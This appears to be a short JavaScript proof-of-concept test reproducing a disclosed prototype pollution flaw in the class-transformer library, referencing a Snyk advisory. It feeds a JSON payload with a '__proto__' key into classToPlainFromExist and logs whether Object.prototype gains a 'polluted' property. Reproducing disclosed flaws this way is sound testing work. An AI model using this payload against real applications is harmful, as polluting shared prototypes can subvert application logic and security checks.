// //https://snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431
// test("prototype pollution in class-transformer", () => {
console.log({}.polluted);

  const root = require("class-transformer");
  const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
  root.classToPlainFromExist(payload, {});

console.log({}.polluted);
// });
